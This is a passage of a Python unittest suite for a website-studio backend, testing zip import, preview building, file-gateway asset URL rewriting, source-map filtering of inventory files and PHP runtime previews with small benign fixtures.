            self.assertNotIn('data-src="assets/photo.webp"', document["html"])
            self.assertNotIn('rel="stylesheet" href="__WEBSITE_STUDIO_PREVIEW_ORIGIN__/api/apps/website-studio/backend/media?preview_id=', document["html"])
            self.assertIn('href="#trails"', document["html"])
            gateway_manifests = list((data_root / "run" / "file-gateway").glob("gw_*.json"))
            self.assertGreaterEqual(len(gateway_manifests), 4)
            gateway_manifest = json.loads(gateway_manifests[0].read_text(encoding="utf-8"))
            self.assertEqual(gateway_manifest["access"], "public_capability")
            self.assertEqual(gateway_manifest["schema"], "maverick.app.file_gateway.v1")
            self.assertTrue(gateway_manifest["allowed_paths"])
            self.assertIn("expires_at", gateway_manifest)
            self.assertIn("asset_gateway", document["source_map"])
            self.assertTrue(document["source_map"]["asset_gateway"]["assets/photo.webp"].startswith("/api/apps/website-studio/backend/file/gw_"))
            self.assertEqual(
                document["source_map"]["asset_gateway"]["images/cortina.webp"],
                document["source_map"]["asset_gateway"]["assets/images/cortina.webp"],
            )
            self.assertEqual(
                document["source_map"]["asset_gateway"]["fonts/Trail.woff2"],
                document["source_map"]["asset_gateway"]["assets/fonts/Trail.woff2"],
            )
            cache_files = list((data_root / "run" / "preview-documents" / preview["preview_id"]).glob("*.json"))
            self.assertEqual(len(cache_files), 1)
            status, cached_document = handle_action(data_root, {"action": "preview_document", "preview_id": preview["preview_id"]})
            self.assertEqual(status, 200)
            self.assertIn("/api/apps/website-studio/backend/file/gw_", cached_document["html"])
            self.assertNotIn("/api/apps/website-studio/backend/media?", cached_document["html"])

            status, css_media = handle_action(
                data_root,
                {"action": "preview_media", "preview_id": preview["preview_id"], "path": "assets/site.css"},
            )
            self.assertEqual(status, 200)
            css_path = Path(css_media["file_response"]["path"])
            self.assertTrue(css_path.exists())
            self.assertEqual(css_media["file_response"]["content_type"], "text/css; charset=utf-8")
            self.assertEqual(css_media["file_response"]["headers"]["Access-Control-Allow-Origin"], "*")
            self.assertEqual(css_media["file_response"]["headers"]["Cross-Origin-Resource-Policy"], "cross-origin")
            self.assertEqual(css_media["file_response"]["cache_control"], "private, max-age=1800")
            self.assertIn("path=assets%2Fbg.webp", css_path.read_text(encoding="utf-8"))

            video_bytes = b"0" * (3 * 1024 * 1024)
            video_target = data_root / "sites" / imported["site"]["id"] / "source" / "assets" / "hero.mp4"
            video_target.write_bytes(video_bytes)
            status, video_media = handle_action(
                data_root,
                {"action": "preview_media", "preview_id": preview["preview_id"], "path": "assets/hero.mp4"},
            )
            self.assertEqual(status, 200)
            self.assertEqual(video_media["file_response"]["path"], str(video_target.resolve()))
            self.assertEqual(video_media["file_response"]["content_type"], "video/mp4")
            self.assertEqual(video_media["file_response"]["cache_control"], "private, max-age=1800")

            entrypoint_payload = {
                "data_root": str(data_root),
                "body": {},
                "route_path": "/api/apps/website-studio/backend/media",
                "method": "GET",
                "query": {"preview_id": preview["preview_id"], "path": "assets/site.css"},
                "headers": {},
            }
            result = subprocess.run(
                [sys.executable, str(APP_ROOT / "backend" / "app_backend.py")],
                cwd=APP_ROOT,
                input=json.dumps(entrypoint_payload),
                capture_output=True,
                text=True,
                check=False,
                env={**os.environ, "PYTHONPATH": str(MAVERICK_ROOT)},
            )
            self.assertEqual(result.returncode, 0, result.stderr)
            entrypoint_response = json.loads(result.stdout)
            self.assertEqual(entrypoint_response["status_code"], 200)
            self.assertIn("file_response", entrypoint_response)
            self.assertEqual(entrypoint_response.get("json", {}).get("preview_id"), preview["preview_id"])

            document_entrypoint_payload = {
                "data_root": str(data_root),
                "body": {"action": "preview_document", "preview_id": preview["preview_id"]},
                "route_path": "/api/apps/website-studio/backend",
                "method": "POST",
                "query": {},
                "headers": {"Origin": "https://studio.example"},
            }
            result = subprocess.run(
                [sys.executable, str(APP_ROOT / "backend" / "app_backend.py")],
                cwd=APP_ROOT,
                input=json.dumps(document_entrypoint_payload),
                capture_output=True,
                text=True,
                check=False,
                env={**os.environ, "PYTHONPATH": str(MAVERICK_ROOT)},
            )
            self.assertEqual(result.returncode, 0, result.stderr)
            entrypoint_response = json.loads(result.stdout)
            entrypoint_html = entrypoint_response["json"]["html"]
            self.assertIn("https://studio.example/api/apps/website-studio/backend/file/gw_", entrypoint_html)
            self.assertIn("style-src &#39;unsafe-inline&#39; blob: https: https://studio.example/api/apps/website-studio/backend/media https://studio.example/api/apps/website-studio/backend/file/", entrypoint_html)
            self.assertNotIn("__WEBSITE_STUDIO_PREVIEW_ORIGIN__", entrypoint_html)
            self.assertNotIn("__WEBSITE_STUDIO_PREVIEW_MEDIA_SOURCE__", entrypoint_html)
            self.assertNotIn("__WEBSITE_STUDIO_PREVIEW_FILE_GATEWAY_SOURCE__", entrypoint_html)
            self.assertNotIn("__WEBSITE_STUDIO_PREVIEW_BACKEND_SOURCE__", entrypoint_html)

            status, nested_preview = handle_action(data_root, {"action": "build_preview", "site_id": imported["site"]["id"], "route": "/legal/terms"})
            self.assertEqual(status, 200)
            status, nested_document = handle_action(data_root, {"action": "preview_document", "preview_id": nested_preview["preview_id"]})
            self.assertEqual(status, 200)
            self.assertIn('data-website-studio-inline-stylesheet="assets/site.css"', nested_document["html"])
            self.assertIn("/api/apps/website-studio/backend/file/gw_", nested_document["html"])
            self.assertIn("assets/photo.webp", nested_document["source_map"]["asset_refs"])
            self.assertNotIn('href="../assets/site.css"', nested_document["html"])
            self.assertNotIn('data-src="../assets/photo.webp"', nested_document["html"])

    def test_preview_documents_reuse_file_gateway_urls_for_shared_assets(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            archive = BytesIO()
            with ZipFile(archive, "w") as zip_file:
                zip_file.writestr(
                    "index.html",
                    '<!doctype html><html><body><main><h1>Home</h1><img src="assets/logo.svg" alt=""></main></body></html>',
                )
                zip_file.writestr(
                    "about.html",
                    '<!doctype html><html><body><main><h1>About</h1><img src="assets/logo.svg" alt=""></main></body></html>',
                )
                zip_file.writestr("assets/logo.svg", '<svg xmlns="http://www.w3.org/2000/svg"><rect width="24" height="24"/></svg>')
            encoded = base64.b64encode(archive.getvalue()).decode("ascii")

            status, imported = handle_action(data_root, {"action": "import_zip", "display_name": "Shared Assets", "archive_base64": encoded})
            self.assertEqual(status, 201)
            site_id = imported["site"]["id"]

            status, home_preview = handle_action(data_root, {"action": "build_preview", "site_id": site_id, "route": "/"})
            self.assertEqual(status, 200)
            status, about_preview = handle_action(data_root, {"action": "build_preview", "site_id": site_id, "route": "/about"})
            self.assertEqual(status, 200)
            self.assertNotEqual(home_preview["preview_id"], about_preview["preview_id"])

            status, home_document = handle_action(data_root, {"action": "preview_document", "preview_id": home_preview["preview_id"]})
            self.assertEqual(status, 200)
            status, about_document = handle_action(data_root, {"action": "preview_document", "preview_id": about_preview["preview_id"]})
            self.assertEqual(status, 200)

            home_gateway = home_document["source_map"]["asset_gateway"]["assets/logo.svg"]
            about_gateway = about_document["source_map"]["asset_gateway"]["assets/logo.svg"]
            self.assertEqual(home_gateway, about_gateway)
            self.assertIn(home_gateway, about_document["html"])

            logo_manifests = []
            for path in (data_root / "run" / "file-gateway").glob("gw_*.json"):
                manifest = json.loads(path.read_text(encoding="utf-8"))
                if manifest.get("asset_path") == "assets/logo.svg":
                    logo_manifests.append(manifest)
            self.assertEqual(len(logo_manifests), 1)
            self.assertEqual(logo_manifests[0]["file_response"]["cache_control"], "private, max-age=1800")
            reuse_index = json.loads((data_root / "run" / "file-gateway" / "reuse-index.json").read_text(encoding="utf-8"))
            self.assertEqual(reuse_index["schema"], "website-studio.file_gateway_reuse_index.v1")
            self.assertTrue(reuse_index["entries"])

            status, logo_file = handle_action(data_root, {"action": "read_file", "site_id": site_id, "path": "assets/logo.svg"})
            self.assertEqual(status, 200)
            status, _ = handle_action(
                data_root,
                {
                    "action": "write_file",
                    "site_id": site_id,
                    "path": "assets/logo.svg",
                    "content": '<svg xmlns="http://www.w3.org/2000/svg"><circle cx="12" cy="12" r="12"/></svg>',
                    "expected_hash": logo_file["file"]["hash"],
                },
            )
            self.assertEqual(status, 200)
            status, changed_preview = handle_action(data_root, {"action": "build_preview", "site_id": site_id, "route": "/"})
            self.assertEqual(status, 200)
            self.assertNotEqual(changed_preview["preview_id"], home_preview["preview_id"])
            status, changed_document = handle_action(data_root, {"action": "preview_document", "preview_id": changed_preview["preview_id"]})
            self.assertEqual(status, 200)
            changed_gateway = changed_document["source_map"]["asset_gateway"]["assets/logo.svg"]
            self.assertNotEqual(changed_gateway, home_gateway)
            self.assertIn(changed_gateway, changed_document["html"])

    def test_preview_media_gateway_replacement_records_html_only_aliases(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            archive = BytesIO()
            with ZipFile(archive, "w") as zip_file:
                zip_file.writestr("index.html", "<!doctype html><main>Alias only</main>")
                zip_file.writestr("assets/images/solo.webp", b"solo")
            encoded = base64.b64encode(archive.getvalue()).decode("ascii")

            status, imported = handle_action(data_root, {"action": "import_zip", "display_name": "Alias Only", "archive_base64": encoded})
            self.assertEqual(status, 201)
            status, preview = handle_action(data_root, {"action": "build_preview", "site_id": imported["site"]["id"]})
            self.assertEqual(status, 200)
            gateway_urls: dict[str, str] = {}
            html = f'<img src="/api/apps/website-studio/backend/media?preview_id={preview["preview_id"]}&path=images/solo.webp">'

            rewritten = _replace_preview_media_urls_with_gateway(data_root, {"id": preview["preview_id"]}, html, gateway_urls=gateway_urls)

            self.assertIn("/api/apps/website-studio/backend/file/gw_", rewritten)
            self.assertEqual(gateway_urls["images/solo.webp"], gateway_urls["assets/images/solo.webp"])

    def test_preview_document_marks_unresolved_asset_gateway_refs(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            archive = BytesIO()
            with ZipFile(archive, "w") as zip_file:
                zip_file.writestr("index.html", '<!doctype html><link rel="stylesheet" href="assets/styles.css"><main>Missing stylesheet</main>')
            encoded = base64.b64encode(archive.getvalue()).decode("ascii")

            status, imported = handle_action(data_root, {"action": "import_zip", "display_name": "Missing Asset", "archive_base64": encoded})
            self.assertEqual(status, 201)
            status, preview = handle_action(data_root, {"action": "build_preview", "site_id": imported["site"]["id"]})
            self.assertEqual(status, 200)
            status, document = handle_action(data_root, {"action": "preview_document", "preview_id": preview["preview_id"]})
            self.assertEqual(status, 200)

            self.assertIn("assets/styles.css", document["source_map"]["asset_refs"])
            self.assertNotIn("assets/styles.css", document["source_map"]["asset_gateway"])
            self.assertIn("assets/styles.css", document["source_map"]["asset_gateway_unresolved"])

    def test_preview_report_includes_source_map_asset_coverage_and_acceptance(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            archive = BytesIO()
            with ZipFile(archive, "w") as zip_file:
                zip_file.writestr(
                    "index.html",
                    (
                        "<!doctype html><html><head>"
                        '<link rel="stylesheet" href="assets/site.css">'
                        "</head><body>"
                        '<main><h1>Trail</h1><button class="cta">Book now</button>'
                        '<img src="assets/logo.webp" alt="">'
                        '<video src="assets/hero.mp4" muted></video></main>'
                        "</body></html>"
                    ),
                )
                zip_file.writestr("assets/site.css", "@font-face{font-family:Trail;src:url('font.woff2')} main{background:url('bg.webp')}")
                zip_file.writestr("assets/font.woff2", b"font")
                zip_file.writestr("assets/bg.webp", b"bg")
                zip_file.writestr("assets/logo.webp", b"logo")
                zip_file.writestr("assets/hero.mp4", b"video")
                zip_file.writestr("assets/unused.webp", b"unused")
            encoded = base64.b64encode(archive.getvalue()).decode("ascii")

            status, imported = handle_action(data_root, {"action": "import_zip", "display_name": "Observable", "archive_base64": encoded})
            self.assertEqual(status, 201)
            site_id = imported["site"]["id"]
            status, preview = handle_action(data_root, {"action": "build_preview", "site_id": site_id, "route": "/"})
            self.assertEqual(status, 200)

            status, document = handle_action(data_root, {"action": "preview_document", "preview_id": preview["preview_id"]})
            self.assertEqual(status, 200)
            self.assertIn("source_map", document)
            self.assertIn("index.html", document["source_map"]["source_files"])
            self.assertIn("asset_index", document["source_map"])
            self.assertIn("asset_summary", document["source_map"])
            self.assertNotIn("assets", document["source_map"])
            default_asset_paths = {item["path"] for item in document["source_map"]["asset_index"]}
            self.assertNotIn("assets/unused.webp", default_asset_paths)
            self.assertTrue(any(hint["selector"] == ".cta" for hint in document["source_map"]["selector_hints"]))
            self.assertEqual(document["observability"]["browser_report_global"], "__WEBSITE_STUDIO_PREVIEW_REPORT__")

            status, report_payload = handle_action(data_root, {"action": "preview_report", "preview_id": preview["preview_id"]})
            self.assertEqual(status, 201)
            report = report_payload["report"]
            self.assertEqual(report["preview_id"], preview["preview_id"])
            self.assertTrue(any(component["selector"] == ".cta" for component in report["components"]))
            self.assertTrue(report["acceptance"]["passed"])
            self.assertEqual(report["asset_coverage"]["status"], "passed")
            self.assertGreaterEqual(report["asset_coverage"]["font_count"], 1)
            self.assertGreaterEqual(report["asset_coverage"]["video_count"], 1)
            resolved_paths = {item["path"] for item in report["asset_coverage"]["resolved"]}
            self.assertIn("assets/font.woff2", resolved_paths)
            self.assertIn("assets/hero.mp4", resolved_paths)
            self.assertIn("assets/logo.webp", resolved_paths)
            self.assertEqual(report["browser_probe"]["event_type"], "maverick.website-studio.preview-report")

            status, inventory_report_payload = handle_action(data_root, {"action": "preview_report", "preview_id": preview["preview_id"], "include_inventory": True})
            self.assertEqual(status, 201)
            inventory_paths = {item["path"] for item in inventory_report_payload["report"]["source_map"]["asset_index"]}
            self.assertIn("assets/unused.webp", inventory_paths)

            status, compared_payload = handle_action(
                data_root,
                {"action": "preview_report", "preview_id": preview["preview_id"], "baseline_report_id": report["id"]},
            )
            self.assertEqual(status, 201)
            self.assertEqual(compared_payload["report"]["comparison"]["baseline_report_id"], report["id"])
            self.assertEqual(compared_payload["report"]["comparison"]["missing_asset_delta"], 0)

            status, runtime = handle_action(data_root, {"action": "runtime_status", "site_id": site_id})
            self.assertEqual(status, 200)
            self.assertEqual(runtime["latest_preview_report"]["preview_id"], preview["preview_id"])

    def test_visual_navigation_excludes_source_inventory_and_exposes_components(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            status, created = handle_action(data_root, {"action": "site_create", "display_name": "Giuntitrail"})
            self.assertEqual(status, 201)
            site_id = created["site"]["id"]
            source_root = data_root / "sites" / site_id / "source"
            (source_root / "index.html").write_text(
                (
                    "<!doctype html><html><head><title>Trail Home</title>"
                    '<link rel="stylesheet" href="assets/site.css"></head><body>'
                    '<main><section id="hero"><h1>Giuntitrail</h1><a href="#booking">Book</a>'
                    '<button class="cta">Join now</button></section><section id="booking"><h2>Booking</h2></section></main>'
                    "</body></html>"
                ),
                encoding="utf-8",
            )
            (source_root / "about.html").write_text("<!doctype html><title>About</title><main><h1>About</h1></main>", encoding="utf-8")
            (source_root / "assets").mkdir(exist_ok=True)
            (source_root / "assets" / "site.css").write_text("body{color:#123}", encoding="utf-8")
            (source_root / "assets" / "unused.png").write_bytes(b"unused")
            (source_root / ".gitignore").write_text("node_modules\n", encoding="utf-8")
            (source_root / ".htaccess").write_text("RewriteEngine On\n", encoding="utf-8")
            (source_root / "README.md").write_text("internal notes\n", encoding="utf-8")
            (source_root / "backend-admin").mkdir(exist_ok=True)
            (source_root / "backend-admin" / "panel.php").write_text("<?php echo 'admin';", encoding="utf-8")
            rebuild_index(data_root, site_id)

            status, inventory = handle_action(data_root, {"action": "sitemap", "site_id": site_id})
            self.assertEqual(status, 200)
            inventory_paths = {item["path"] for item in inventory["assets"]}
            self.assertIn(".gitignore", inventory_paths)
            self.assertIn(".htaccess", inventory_paths)
            self.assertIn("README.md", inventory_paths)
            self.assertIn("backend-admin/panel.php", inventory_paths)

            status, preview = handle_action(data_root, {"action": "build_preview", "site_id": site_id, "route": "/"})
            self.assertEqual(status, 200)
            (source_root / "package.json").write_text('{"scripts":{"build":"webpack"}}', encoding="utf-8")
            (source_root / "webpack.config.js").write_text("module.exports = {};\n", encoding="utf-8")
            with closing(sqlite3.connect(data_root / "app.sqlite")) as db, db:
                db.execute(
                    "UPDATE pages SET source_files_json = ? WHERE site_id = ? AND route = '/'",
                    (json.dumps(["index.html", ".htaccess", "package.json", "webpack.config.js"]), site_id),
                )
            status, document = handle_action(data_root, {"action": "preview_document", "preview_id": preview["preview_id"]})
            self.assertEqual(status, 200)
            source_map_text = json.dumps(document["source_map"], sort_keys=True)
            self.assertIn("index.html", document["source_map"]["source_files"])
            self.assertNotIn(".htaccess", source_map_text)
            self.assertNotIn("package.json", source_map_text)
            self.assertNotIn("webpack.config.js", source_map_text)
            status, debug_document = handle_action(data_root, {"action": "preview_document", "preview_id": preview["preview_id"], "include_inventory": True})
            self.assertEqual(status, 200)
            debug_source_map_text = json.dumps(debug_document["source_map"], sort_keys=True)
            self.assertIn(".htaccess", debug_source_map_text)
            self.assertIn("package.json", debug_source_map_text)
            self.assertIn("webpack.config.js", debug_source_map_text)
            status, report_payload = handle_action(data_root, {"action": "preview_report", "preview_id": preview["preview_id"]})
            self.assertEqual(status, 201)

            status, navigation = handle_action(data_root, {"action": "navigation_analyze", "site_id": site_id})
            self.assertEqual(status, 200)
            self.assertTrue(navigation["inventory_summary"]["source_inventory_hidden"])
            self.assertEqual(navigation["analysis_coverage"]["observed_page_count"], 1)
            self.assertEqual(navigation["analysis_coverage"]["pages_without_report_count"], 1)
            self.assertEqual(navigation["analysis_coverage"]["pages_without_report"][0]["route"], "/about")
            self.assertTrue(any(item["scope"] == "analysis_coverage" for item in navigation["warnings"]))
            navigation_text = json.dumps(navigation, sort_keys=True)
            self.assertNotIn(".gitignore", navigation_text)
            self.assertNotIn(".htaccess", navigation_text)
            self.assertNotIn("README.md", navigation_text)
            self.assertNotIn("backend-admin", navigation_text)
            self.assertNotIn("package.json", navigation_text)
            self.assertNotIn("webpack.config.js", navigation_text)
            home = navigation["pages"][0]
            self.assertEqual(home["route"], "/")
            self.assertTrue(any(section["anchor"] == "#booking" for section in home["anchors"]))
            self.assertTrue(any(section["selector"] == "#hero" for section in home["sections"]))
            component = next(item for item in home["components"] if item["selector"] == ".cta")
            self.assertEqual(component["route"], "/")
            self.assertEqual(component["last_report_id"], report_payload["report"]["id"])
            component_selectors = {item["selector"] for item in home["components"]}
            self.assertNotIn("link[href]", component_selectors)
            self.assertNotIn("a[href]", component_selectors)
            self.assertNotIn("meta[href]", component_selectors)

            legacy_component = {**component, "source_files": ["index.html", ".htaccess", "package.json", "webpack.config.js"]}
            legacy_report = {
                "id": "report_legacy_noisy",
                "site_id": site_id,
                "preview_id": preview["preview_id"],
                "route": "/",
                "runtime_kind": "php",
                "runtime_status": "ready",
                "generated_at": "2999-01-01T00:00:00+00:00",
                "acceptance": {"passed": True, "checks": []},
                "source_map": {
                    "site_id": site_id,
                    "preview_id": preview["preview_id"],
                    "route": "/",
                    "route_id": home["route_id"],
                    "page_id": home["id"],
                    "source_files": ["index.html", ".htaccess", "package.json", "webpack.config.js"],
                    "route_source_files": ["index.html", ".htaccess", "package.json", "webpack.config.js"],
                    "asset_refs": ["assets/site.css"],
                    "asset_index": [
                        {"id": "asset_hidden", "path": ".gitignore", "kind": "file", "status": "unlinked"},
                        {"id": "asset_config", "path": "webpack.config.js", "kind": "file", "status": "unlinked"},
                        {"id": "asset_css", "path": "assets/site.css", "kind": "stylesheet", "content_type": "text/css", "status": "referenced"},
                    ],
                    "selector_hints": [
                        {
                            "selector": ".cta",
                            "token": "cta",
                            "tag": "button",
                            "source_files": ["index.html", "package.json", "webpack.config.js"],
                            "confidence": "token_match",
                        }
                    ],
                },
                "asset_coverage": {
                    "status": "passed",
                    "resolved_count": 1,
                    "missing_count": 0,
                    "resolved": [
                        {
                            "path": "assets/site.css",
                            "requested_path": "assets/site.css",
                            "kind": "stylesheet",
                            "content_type": "text/css",
                            "size_bytes": 16,
                            "status": "ok",
                        }
                    ],
                    "missing": [],
                },
                "components": [legacy_component],
                "navigation": {"route": "/", "page_id": home["id"], "components": [legacy_component]},
            }
            with closing(sqlite3.connect(data_root / "app.sqlite")) as db, db:
                db.execute(
                    """
                    INSERT INTO preview_reports(id, site_id, preview_id, route, status, report_json, created_at)
                    VALUES (?, ?, ?, '/', 'passed', ?, ?)
                    """,
                    (legacy_report["id"], site_id, preview["preview_id"], json.dumps(legacy_report, sort_keys=True), legacy_report["generated_at"]),
                )

            status, component_context = handle_action(
                data_root,
                {
                    "action": "page_context",
                    "site_id": site_id,
                    "route": "/",
                    "component_id": component["id"],
                    "target_selector": component["selector"],
                },
            )
            self.assertEqual(status, 200)
            self.assertEqual(component_context["active_view"], "component")
            self.assertEqual(component_context["component_id"], component["id"])
            self.assertEqual(component_context["target_selector"], ".cta")
            self.assertEqual(component_context["source_files"], component["source_files"])
            self.assertEqual(component_context["page_source_files"], ["index.html"])
            self.assertFalse(component_context["context_policy"]["inventory_included"])
            component_context_text = json.dumps(component_context, sort_keys=True)
            self.assertNotIn(".gitignore", component_context_text)
            self.assertNotIn("README.md", component_context_text)
            self.assertNotIn("backend-admin", component_context_text)
            self.assertNotIn("package.json", component_context_text)
            self.assertNotIn("webpack.config.js", component_context_text)
            runtime_report_text = json.dumps(component_context["runtime"]["latest_preview_report"], sort_keys=True)
            self.assertEqual(component_context["runtime"]["latest_preview_report"]["id"], "report_legacy_noisy")
            self.assertNotIn(".gitignore", runtime_report_text)
            self.assertNotIn("package.json", runtime_report_text)
            self.assertNotIn("webpack.config.js", runtime_report_text)
            visual_asset_paths = {item["path"] for item in component_context["visual_assets"]}
            self.assertIn("assets/site.css", visual_asset_paths)

            status, debug_component_context = handle_action(
                data_root,
                {
                    "action": "page_context",
                    "site_id": site_id,
                    "route": "/",
                    "component_id": component["id"],
                    "target_selector": component["selector"],
                    "include_inventory": True,
                },
            )
            self.assertEqual(status, 200)
            self.assertTrue(debug_component_context["context_policy"]["inventory_included"])
            self.assertIn("package.json", debug_component_context["page_source_files"])
            self.assertIn("webpack.config.js", debug_component_context["page_source_files"])
            debug_runtime_report_text = json.dumps(debug_component_context["runtime"]["latest_preview_report"], sort_keys=True)
            self.assertIn("package.json", debug_runtime_report_text)
            self.assertIn("webpack.config.js", debug_runtime_report_text)
            debug_asset_paths = {item["path"] for item in debug_component_context["assets"]}
            self.assertIn(".gitignore", debug_asset_paths)
            self.assertIn(".htaccess", debug_asset_paths)

    def test_preview_contract_reports_missing_runtime_requirements_for_build_and_php_sites(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            archive = BytesIO()
            with ZipFile(archive, "w") as zip_file:
                zip_file.writestr("frontend-website/index.php", "<?php echo 'Home';")
                zip_file.writestr("frontend-website/index.html", "<title>PHP fallback</title>")
                zip_file.writestr("package.json", '{"scripts":{"build":"vite build"}}')
                zip_file.writestr("package-lock.json", "{}")
            encoded = base64.b64encode(archive.getvalue()).decode("ascii")

            status, imported = handle_action(data_root, {"action": "import_zip", "display_name": "Runtime", "archive_base64": encoded})
            self.assertEqual(status, 201)
            profile = imported["import"]["source_profile"]
            self.assertEqual(profile["preview_runtime_kind"], "php")
            self.assertEqual(profile["php_docroot"], "frontend-website")
            self.assertEqual(profile["missing_requirements"], [])
            self.assertTrue(profile["runtime_preview_supported"])

            with patch("preview_runtime.shutil.which", return_value=None):
                status, preview = handle_action(data_root, {"action": "build_preview", "site_id": imported["site"]["id"]})
            self.assertEqual(status, 200)
            self.assertEqual(preview["runtime_kind"], "php")
            self.assertEqual(preview["runtime_status"], "blocked")
            self.assertIn("php executable", preview["missing_requirements"][0])
            self.assertIn("Preview runtime unavailable", preview["html"])

            with closing(sqlite3.connect(data_root / "app.sqlite")) as db, db:
                row = db.execute("SELECT status, route FROM previews WHERE id = ?", (preview["preview_id"],)).fetchone()
            self.assertEqual(row, ("blocked", preview["route"]))

    @unittest.skipUnless(shutil.which("php"), "php executable is required for PHP runtime preview integration")
    def test_php_preview_falls_back_to_docroot_when_local_router_returns_empty_body(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            archive = BytesIO()
            with ZipFile(archive, "w") as zip_file:
                zip_file.writestr(
                    "frontend-website/index.php",
                    "<?php echo '<!doctype html><html><head><title>Docroot Home</title></head><body><main>PHP Docroot Home</main></body></html>';",
                )
                zip_file.writestr(
                    "local/router.php",
                    (
                        "<?php\n"
                        "if ($_SERVER['REQUEST_URI'] === '/' || $_SERVER['REQUEST_URI'] === '') {\n"
                        "    @include __DIR__ . '/frontend-website/index.php';\n"
                        "    return;\n"
                        "}\n"
                        "http_response_code(404);\n"
                    ),
                )
            encoded = base64.b64encode(archive.getvalue()).decode("ascii")

            status, imported = handle_action(data_root, {"action": "import_zip", "display_name": "PHP Router", "archive_base64": encoded})
            self.assertEqual(status, 201)
            self.assertEqual(imported["import"]["source_profile"]["preview_runtime_kind"], "php")
            self.assertEqual(imported["import"]["source_profile"]["php_docroot"], "frontend-website")

            status, preview = handle_action(data_root, {"action": "build_preview", "site_id": imported["site"]["id"], "route": "/"})

            self.assertEqual(status, 200)
            self.assertEqual(preview["runtime_kind"], "php")
            self.assertEqual(preview["runtime_status"], "ready")
            self.assertIn("Docroot Home", preview["html"])
            self.assertIn("PHP Docroot Home", preview["html"])
            self.assertIn("PHP router returned an empty response", " ".join(preview["warnings"]))

    @unittest.skipUnless(shutil.which("php"), "php executable is required for PHP runtime preview integration")
    def test_php_runtime_global_warnings_do_not_persist_as_page_warnings(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            archive = BytesIO()
            with ZipFile(archive, "w") as zip_file:
                zip_file.writestr(".htaccess", "RewriteEngine On\n")
                zip_file.writestr(
                    "frontend-website/index.php",
                    "<?php echo '<!doctype html><html><head><title>Home</title></head><body><main>PHP Home</main></body></html>';",
                )
                zip_file.writestr(
                    "local/router.php",
                    (
                        "<?php\n"
                        "$projectRoot = dirname(__DIR__);\n"
                        "$uri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH) ?: '/';\n"
                        "if ($uri === '/' || $uri === '/index.php') {\n"
                        "    include $projectRoot . '/frontend-website/index.php';\n"
                        "    return;\n"
                        "}\n"
                        "http_response_code(404);\n"
                        "echo 'missing';\n"
                    ),
                )
            encoded = base64.b64encode(archive.getvalue()).decode("ascii")

            status, imported = handle_action(data_root, {"action": "import_zip", "display_name": "PHP Caveats", "archive_base64": encoded})
            self.assertEqual(status, 201)
            site_id = imported["site"]["id"]
            status, build_payload = handle_action(data_root, {"action": "build_validate", "site_id": site_id})
            self.assertEqual(status, 201)
            self.assertEqual(build_payload["build"]["status"], "passed")

            status, map_payload = handle_action(data_root, {"action": "sitemap", "site_id": site_id})
            self.assertEqual(status, 200)
            pages = {item["route"]: item for item in map_payload["items"]}
            routes = {item["route"]: item for item in map_payload["routes"]}
            self.assertEqual(pages["/"]["warnings"], [])
            self.assertEqual(routes["/"]["warnings"], [])

            status, preview = handle_action(data_root, {"action": "build_preview", "site_id": site_id, "route": "/"})
            self.assertEqual(status, 200)
            preview_warnings = " ".join(preview["warnings"])
            self.assertIn(".htaccess rules are not fully reproduced", preview_warnings)
            self.assertIn("third-party services require explicit preview configuration", preview_warnings)

    @unittest.skipUnless(shutil.which("php"), "php executable is required for PHP runtime preview integration")
    def test_php_preview_rewrites_runtime_assets_and_serves_router_aliases(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            data_root = Path(tmp)
            archive = BytesIO()
            with ZipFile(archive, "w") as zip_file:
                zip_file.writestr(
                    "frontend-website/index.php",
                    (
                        "<?php echo '<!doctype html><html><head><title>PHP Assets</title>"
                        "<link rel=\"stylesheet\" href=\"/dist/css/style.min.css\">"
                        "<link rel=\"preload\" href=\"/fonts/Chilly-Variable.ttf\" as=\"font\">"
                        "</head><body><video src=\"/assets/images/hero.mp4#t=0.1\"></video>"
                        "<div data-bg=\"images/card.webp\"></div>"
                        "<script src=\"/dist/js/main.bundle.js\"></script></body></html>';"
                    ),
                )
                zip_file.writestr(
                    "frontend-website/legal/terms.php",
                    (
                        "<?php echo '<!doctype html><html><head><title>Nested PHP Assets</title>"
                        "<link rel=\"stylesheet\" href=\"../dist/css/style.min.css\">"
                        "</head><body><img data-src=\"../assets/images/card.webp\"></body></html>';"
                    ),
                )
                zip_file.writestr(
                    "local/router.php",
                    (
                        "<?php\n"
                        "$projectRoot = dirname(__DIR__);\n"
                        "$uri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH) ?: '/';\n"
                        "if ($uri === '/' || $uri === '/index.php') {\n"
                        "    include $projectRoot . '/frontend-website/index.php';\n"
                        "    return;\n"
                        "}\n"
                        "if ($uri === '/terms.html') {\n"
                        "    include $projectRoot . '/frontend-website/legal/terms.php';\n"
                        "    return;\n"
                        "}\n"
                        "return false;\n"
                    ),
                )
                zip_file.writestr("frontend-website/dist/css/style.min.css", "@font-face{src:url('/fonts/Chilly-Variable.ttf')} .x{background:url('/assets/images/card.webp')}")
                zip_file.writestr("frontend-website/dist/js/main.bundle.js", "window.__assetPreview = true;")
                zip_file.writestr("frontend-website/assets/fonts/Chilly-Variable.ttf", b"font")
                zip_file.writestr("frontend-website/assets/images/card.webp", b"card")
                zip_file.writestr("frontend-website/assets/images/hero.mp4", b"0" * (3 * 1024 * 1024))
            encoded = base64.b64encode(archive.getvalue()).decode("ascii")

            status, imported = handle_action(data_root, {"action": "import_zip", "display_name": "PHP Assets", "archive_base64": encoded})
            self.assertEqual(status, 201)
            status, preview = handle_action(data_root, {"action": "build_preview", "site_id": imported["site"]["id"], "route": "/"})

            self.assertEqual(status, 200)
            self.assertEqual(preview["runtime_kind"], "php")
            self.assertEqual(preview["runtime_status"], "ready")
            self.assertIn('data-website-studio-inline-stylesheet="dist/css/style.min.css"', preview["html"])
